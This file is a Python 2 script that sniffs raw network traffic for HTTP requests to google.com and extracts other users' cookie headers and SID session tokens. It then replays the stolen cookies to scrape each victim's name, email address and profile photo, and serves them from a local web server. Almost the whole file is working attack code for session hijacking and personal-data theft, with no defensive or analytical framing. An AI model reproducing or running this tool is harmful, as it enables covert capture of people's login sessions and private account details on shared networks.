###########################################################################################################
									# Import Necessary Libraries #
###########################################################################################################
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler
from SocketServer import ThreadingMixIn
from bs4 import BeautifulSoup
import sys, socket, struct, os, array, copy, dpkt, requests, threading, time

# necessary for accessing libdnet from within a virtualenv on OSX
if sys.platform == "darwin":
  import site; site.addsitedir("/usr/local/lib/python2.7/site-packages")

from scapy.all import ETH_P_ALL
from scapy.all import select
from scapy.all import MTU


###########################################################################################################
									# Declare Global Variables #
###########################################################################################################

session_ids =set()  # global set for all session ids
user_packet ={} 	# # dict that contains the whole user packet
user_complete = {}	# dict to track packet status if chunked
user_start = {}		# dict to track user packet start
cookie_dict = {} 	# dict to store the user cookies
img_dict =  {} 		# dict to store the pared image URL


###########################################################################################################
                    # Function to Extract Session Token From Google Cookie String #
###########################################################################################################

def extract_google_stok(cookie):
	session_tok = None;
	cookie_toks = cookie.split(": ")[1].split("; ")
	for i in cookie_toks:
		if i[0:4].lower() == "sid=":
			session_tok = i.split("SID=")[1]
			break
	if session_tok == None:
		return None
	else:
		return session_tok


###########################################################################################################
                    # Function to Extract Session Token From Google Cookie String #
###########################################################################################################

def extract_cookie(src_ip, src_port, payload):

	# provide access to globar variables
	global cookie_dict
	global session_ids
	global user_packet
	global user_complete
	global user_start
	global counter
	s_tok = None
	cur_packet = None
	user_key = src_ip+":"+src_port

	#create an entry for a user tuple
	if 'get /' in payload.lower()  and "google.com" in payload.lower() and user_key not in user_packet:
		user_packet[user_key] =	 None
		user_complete[user_key] = 0

	#update packet collection for each individual stream
	if user_key in user_packet and '\r\n\r\n' in payload and user_key not in user_start:

		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] = cur_packet
		user_complete[user_key] = 1

	elif user_key in user_packet and '\r\n\r\n' not in payload and user_key not in user_start:
		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] =  cur_packet
		user_start[user_key] = 1

	elif user_key in user_packet and user_key in user_start and  user_complete[user_key] == 0:
		cur_packet = copy.deepcopy(payload)
		user_packet[user_key] =  user_packet[user_key] + cur_packet

		# if this was the last chunk of the packet
		if '\r\n\r\n' in cur_packet:
			packet_start = 0
			del user_start[user_key]
			user_complete[user_key] = 1

	# extract the user cookie and store it
	if user_key in user_complete:

		if user_complete[user_key] ==1 and "cookie" in user_packet[user_key].lower():
			
		 	header_arr = user_packet[user_key].split("\r\n")

		 	for field  in header_arr:
				if "cookie: "in field.lower(): #if cookie is found in the header
		 			cookie_str = field
					s_tok = extract_google_stok(field)
					print "cookie found"
					break

			if s_tok not in session_ids and s_tok != None:
	  			session_ids.update([s_tok])
	 			temp_cookie = cookie_str.split(": ")[1]
	 			print temp_cookie
	 			
	 			cookie_dict[src_ip] = temp_cookie

			if user_complete[user_key] == 1:
				del user_complete[user_key]
				del	user_packet[user_key]


###########################################################################################################
                # Function to Replay the Cookie Request, Perfomed by the Response Server #
###########################################################################################################

def make_request (user_ip, cookie):

	global img_dict

	url = 'http://www.google.com/?gws_rd=ssl'
	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get(url, headers=add_headers)
	resp = r.content
	soup = BeautifulSoup(resp, 'html.parser')
	name_div = soup.findAll("div", { "class" : "gb_Cb"})
	name = name_div[0].text
	email_div = soup.findAll("div", { "class" : "gb_Db"})
	email = email_div[0].text.split(" ")[0]
	img_link = resp.split("::before{content:url(//")[1].split(");")[0].replace("/s32","/s500")
	img_dict[user_ip] = img_link
	return name, email


###########################################################################################################
                           # Function to Grab User Image Data Content #
###########################################################################################################

def grab_img (img_link, cookie):

	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
	add_headers["Cookie"] = cookie
	r = requests.get("http://"+img_link, headers=add_headers)

	return r.content


###########################################################################################################
                           # Function to Grab User Image Data Content #
###########################################################################################################

def run_response_server():

	global cookie_dict
	global img_dict

	class Handler(BaseHTTPRequestHandler):

		#Handler for the GET requests
		def do_GET(self):

			self.path = self.path.split("?")[0]
			now = time.time()
			timeout = now + 10
			cookie_flag = 0

			while cookie_flag == 0 :
				
				if self.client_address[0] in cookie_dict:

					if self.path == "/": #send html response

						name, email = make_request(self.client_address[0], cookie_dict[self.client_address[0]])

						self.send_response(200)
						self.send_header('Content-type','text/html')
						self.end_headers()
						
						#make changes here to make the HTML look more facny
						self.wfile.write("<center>"+name+"<br><br>"+email+"<br><br>"+"<img src=\"photo.jpg\" alt=\"profile_picture\" height=\"300\" width=\"300\"></center>")

					elif self.path == "/photo.jpg":

						image_content = grab_img (img_dict[self.client_address[0]], cookie_dict[self.client_address[0]])

						self.send_response(200)
						self.send_header('Content-type','image/jpg')
						self.end_headers()
						self.wfile.write(image_content)

					cookie_flag = 1
					return

				if time.time() > timeout:
					break

			self.send_error(404,'Please try again while signed in with your google account')


	class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
	    """Handle requests in a separate thread."""

	server = ThreadedHTTPServer(('', 8000), Handler)
	print 'Starting server, use <Ctrl-C> to stop'
	server.serve_forever()


###########################################################################################################
                           # Function to Parse The User Packet  #
###########################################################################################################

def packet_parser(packet):

	try:
		if len(packet) <= 0:
			return None
		
		eth_header = struct.unpack("!6s6sH", packet[0:14])

		if eth_header[2] != 0x800:
			return None

		# extract source address and source port at the array from the array

		ip_header = packet[14:34]
		iph = struct.unpack('!BBHHHBBH4s4s' , ip_header)
		ihl = iph[0] & 0xF
		iph_length = ihl * 4
		s_addr = socket.inet_ntoa(iph[8]);

		# extract source address from the array

		tcp_header = packet[14+iph_length:14+iph_length+20]
		tcph = struct.unpack('!HHLLBBHHH' , tcp_header)
		
		source_port = tcph[0]
		tcph_length = tcph[4] >> 4

		h_size = 14 + iph_length + tcph_length * 4
		data_size = len(packet) - h_size
		data = packet[h_size:]

		return [str(s_addr), str(source_port), data]
	except:
		return None


###########################################################################################################
                   					  # Program Main Function #
###########################################################################################################

def main():
	
	# Run the response server in a parallel thread
	server_thread = threading.Thread(target=run_response_server, args=())
	server_thread.daemon = True   
	server_thread.start()

	# Create a raw socket for listening to all packets
	interface = sys.argv[1]
	cookie_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
	cookie_socket.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
	cookie_socket.bind((interface, ETH_P_ALL))

	# Continously listen for packets and parse them
	print "now listening on: "+interface
	while True:

		pkt, sa_ll = cookie_socket.recvfrom(MTU)
		packet_elements = packet_parser(pkt)

		if packet_elements != None:
			extract_cookie(packet_elements[0], packet_elements[1], packet_elements[2])
			

if __name__ == '__main__':
	main()
	
